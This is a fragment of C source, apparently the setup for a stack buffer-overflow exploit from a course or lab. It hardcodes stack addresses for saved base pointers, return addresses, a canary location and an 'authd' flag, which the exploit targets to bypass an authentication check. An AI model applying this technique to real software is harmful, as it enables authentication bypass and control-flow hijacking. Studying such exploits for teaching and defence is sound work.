...
int main(int argc, char* argv[]) {
   ...
   //void *auth_bp = 0xbfffe378;     // saved ebp for auth function                   0xbfffe918
   void *auth_bp = 0xbfffe918;     // saved ebp for auth function                   
   void *auth_ra = 0x08048968;     // return address for auth                      

   void *mainloop_ra = 0x08049f14; // return address for main_loop  
   void *mainloop_bp = 0xbfffea78; // saved ebp for main_loop 0xbffff018
   

   // The following refer to locations on the stack
   void *auth_user = 0xbfffe1d0;   // value of user variable in auth
   void *g_authd = 0xbfffe394;     // location of authd variable of g

   //void *auth_canary_loc = 0xbfffe36c; // location where auth's canary is stored    0xbfffe8dc
   void *auth_canary_loc = 0xbfffe8dc; // location where auth's canary is stored    
   //void *auth_bp_loc = 0xbfffe378; // location of auth's saved bp                   0xbfffe8e8
   void *auth_bp_loc = 0xbfffe8e8; // location of auth's saved bp                   
   //void *auth_ra_loc = 0xbfffe37c; // location of auth's return address             0xbfffe8ec
   void *auth_ra_loc = 0xbfffe8ec; // location of auth's return address             
